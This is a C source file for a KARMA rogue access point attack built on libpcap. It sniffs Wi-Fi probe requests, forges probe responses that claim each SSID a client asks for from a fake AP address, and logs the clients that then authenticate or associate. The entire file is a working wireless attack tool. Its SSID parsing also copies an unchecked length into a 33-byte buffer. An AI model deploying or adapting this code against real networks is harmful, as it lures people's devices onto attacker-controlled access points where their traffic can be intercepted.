#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include <time.h>
#include "protocol.h"

// Macros for parsing Frame Control (byte 0)
#define GET_TYPE(fc0)       (((fc0) >> 2) & 0x03)
#define GET_SUBTYPE(fc0)    (((fc0) >> 4) & 0x0F)

#define TYPE_MGMT           0x00
#define TYPE_CTRL           0x01
#define TYPE_DATA           0x02

#define SUBTYPE_ASSOC_REQ   0x00
#define SUBTYPE_PROBE_REQ   0x04
#define SUBTYPE_PROBE_RESP  0x05
#define SUBTYPE_BEACON      0x08
#define SUBTYPE_AUTH        0x0B


void usage() {
    printf("syntax: karma <interface>\n");
    printf("sample: karma wlan0\n");
}

// Function to construct and send fake Probe Response
void send_probe_response(pcap_t* handle, uint8_t* target_mac, char* ssid, int ssid_len, radiotap_header_t* rt_template) {
    uint8_t packet[256];
    int packet_len = 0;

    // 1. Radiotap Header
    struct {
        uint8_t version;
        uint8_t pad;
        uint16_t len;
        uint32_t present;
    } __attribute__((packed)) radiotap_tx = { 0, 0, 8, 0 }; // plain and simple

    memcpy(packet, &radiotap_tx, sizeof(radiotap_tx));
    packet_len += sizeof(radiotap_tx);

    // 2. 802.11 Header
    dot11_header_t dot11;
    memset(&dot11, 0, sizeof(dot11));
    
    // Frame Control: Type=Mgmt, Subtype=Probe Response
    dot11.frame_control[0] = 0x50; // Version:00 Type:00 Subtype:0101 (Probe Resp) -> 0x50 
    dot11.frame_control[1] = 0x00; // Flags

    dot11.duration = 314; // Random duration
    
    // Addr1: Destination (Target Client MAC)
    memcpy(dot11.receiver_address, target_mac, 6);
    
    // Addr2: Source (Fake AP MAC)
    uint8_t fake_ap_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    memcpy(dot11.transmitter_address, fake_ap_mac, 6);
    
    // Addr3: BSSID (Same as Source)
    memcpy(dot11.bssid, fake_ap_mac, 6);
    
    dot11.sequence_control = 0;

    memcpy(packet + packet_len, &dot11, sizeof(dot11));
    packet_len += sizeof(dot11);

    // 3. Fixed Parameters
    beacon_fixed_params_t fixed_params;
    memset(&fixed_params, 0, sizeof(fixed_params));
    
    fixed_params.beacon_interval = 0x6400; // 100 TU
    fixed_params.capability_info = 0x0431;

    memcpy(packet + packet_len, &fixed_params, sizeof(fixed_params));
    packet_len += sizeof(fixed_params);

    // 4. Tagged Parameters
    
    // Tag 0: SSID
    packet[packet_len++] = 0x00;      // Tag Num: SSID
    packet[packet_len++] = ssid_len;  // Tag Len
    memcpy(packet + packet_len, ssid, ssid_len); // SSID
    packet_len += ssid_len;

    // Tag 1: Supported Rates
    uint8_t rates[] = { 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24 };
    packet[packet_len++] = 0x01;
    packet[packet_len++] = sizeof(rates);
    memcpy(packet + packet_len, rates, sizeof(rates));
    packet_len += sizeof(rates);

    // Tag 3: DS Parameter Set (Channel)
    packet[packet_len++] = 0x03;
    packet[packet_len++] = 0x01;
    packet[packet_len++] = 0x06; // Channel 6

    // Send Packet
    if (pcap_sendpacket(handle, packet, packet_len) != 0) {
        // fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
    } else {
        printf("[*] Sent Fake Probe Response to %02x:%02x:%02x:%02x:%02x:%02x for SSID: %.*s\n",
            target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],
            ssid_len, ssid);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    
    // Open interface 
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    printf("[*] Starting KARMA attack on %s...\n", dev);
    printf("[*] Listening for Probe Requests...\n");

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        // 1. Skip Radiotap Header
        if (header->caplen < sizeof(radiotap_header_t)) continue;
        radiotap_header_t* radiotap = (radiotap_header_t*)packet;
        
        if (header->caplen < radiotap->len) continue;
        int offset = radiotap->len;
        
        // 2. Parse Dot11 Header
        if (header->caplen < offset + sizeof(dot11_header_t)) continue;
        dot11_header_t* dot11 = (dot11_header_t*)(packet + offset);
        
        uint8_t fc0 = dot11->frame_control[0];
        if (GET_TYPE(fc0) != TYPE_MGMT) continue;

        // Check Subtype 
        uint8_t subtype = GET_SUBTYPE(fc0);

        // Case 1: Probe Request (Launch Attack)
        if (subtype == SUBTYPE_PROBE_REQ) {
            // 3. Parse Tagged Parameters to find SSID (Tag 0)
            u_char* frame_body = (u_char*)(packet + offset + sizeof(dot11_header_t));
            int remaining_len = header->caplen - (offset + sizeof(dot11_header_t));

            while (remaining_len >= 2) {
                tagged_param_t* tag = (tagged_param_t*)frame_body;
                
                if (remaining_len < (2 + tag->tag_len)) break;

                if (tag->tag_num == 0) { // SSID Parameter Set
                    if (tag->tag_len > 0) {
                        char ssid[33] = {0};
                        memcpy(ssid, frame_body + 2, tag->tag_len);
                        ssid[tag->tag_len] = '\0'; // Ensure valid C-string for strcmp

                        // Ignore 'unconfigured' SSID (Noise)
                        if (strcmp(ssid, "unconfigured") == 0) {
                            break; 
                        }

                        printf("[+] Probe Request found! SSID: %s | Source: %02x:%02x:%02x:%02x:%02x:%02x\n", 
                            ssid,
                            dot11->transmitter_address[0], dot11->transmitter_address[1], dot11->transmitter_address[2],
                            dot11->transmitter_address[3], dot11->transmitter_address[4], dot11->transmitter_address[5]);
                            
                        // Send Karma Response
                        send_probe_response(handle, dot11->transmitter_address, ssid, tag->tag_len, radiotap);
                        fflush(stdout); 
                    }
                    break; // Found SSID, stop parsing
                }

                // Move to next tag
                int tag_total_len = 2 + tag->tag_len;
                frame_body += tag_total_len;
                remaining_len -= tag_total_len;
            }
        }
        // Case 2: Authentication Request (Attack Success Verification)
        else if (subtype == SUBTYPE_AUTH) {
             printf("[!] Authentication Request detected! From: %02x:%02x:%02x:%02x:%02x:%02x To: %02x:%02x:%02x:%02x:%02x:%02x\n",
                dot11->transmitter_address[0], dot11->transmitter_address[1], dot11->transmitter_address[2],
                dot11->transmitter_address[3], dot11->transmitter_address[4], dot11->transmitter_address[5],
                dot11->receiver_address[0], dot11->receiver_address[1], dot11->receiver_address[2],
                dot11->receiver_address[3], dot11->receiver_address[4], dot11->receiver_address[5]);
             fflush(stdout);
        }
        // Case 3: Association Request (Attack Success Verification)
        else if (subtype == SUBTYPE_ASSOC_REQ) {
             printf("[!!] Association Request detected! From: %02x:%02x:%02x:%02x:%02x:%02x To: %02x:%02x:%02x:%02x:%02x:%02x\n",
                dot11->transmitter_address[0], dot11->transmitter_address[1], dot11->transmitter_address[2],
                dot11->transmitter_address[3], dot11->transmitter_address[4], dot11->transmitter_address[5],
                dot11->receiver_address[0], dot11->receiver_address[1], dot11->receiver_address[2],
                dot11->receiver_address[3], dot11->receiver_address[4], dot11->receiver_address[5]);
             fflush(stdout);
        }
    }

    pcap_close(handle);
    return 0;
}
